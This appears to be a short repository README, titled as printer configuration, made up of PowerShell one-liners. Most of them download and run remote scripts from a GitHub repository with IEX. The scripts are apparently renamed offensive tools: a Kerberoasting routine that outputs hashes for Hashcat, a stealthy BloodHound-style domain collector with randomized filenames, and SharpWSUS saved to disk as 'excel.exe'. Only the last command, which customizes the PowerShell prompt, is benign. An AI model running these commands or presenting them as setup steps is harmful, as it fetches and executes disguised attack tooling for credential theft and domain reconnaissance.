# printerconfiguration


```
$browser = New-Object System.Net.WebClient
$browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials 
```

```
IEX($browser).DownloadString('https://raw.githubusercontent.com/tigerion/printerconfiguration/main/printeroast.ps1');I-KR -OutputFormat Hashcat
```

```
IEX($browser).DownloadString('https://raw.githubusercontent.com/tigerion/printerconfiguration/main/printerSharp.ps1');I-BH -CollectionMethod DCOnly -Stealth -NoSaveCache -RandomizeFilenames -EncryptZip
```

```
(New-Object System.Net.WebClient).DownloadFile("http://github.com/tigerion/printerconfiguration/raw/refs/heads/main/SharpWSUS.exe", "C:\temp\excel.exe")
```
```
New-Item -Path $PROFILE -ItemType File -Force | Out-Null; Set-Content -Path $PROFILE -Value 'function prompt { $e = $LASTEXITCODE; $t = Get-Date -Format "[HH:mm:ss]"; $l = $executionContext.SessionState.Path.CurrentLocation; $n = ">" * ($nestedPromptLevel + 1); Write-Host $t -NoNewline -ForegroundColor DarkGray; Write-Host " PS " -NoNewline -ForegroundColor Cyan; Write-Host "$l" -NoNewline -ForegroundColor Yellow; Write-Host "$n " -NoNewline -ForegroundColor Cyan; $global:LASTEXITCODE = $e; return " " }'; . $PROFILE
```
After
```
. $PROFILE
```
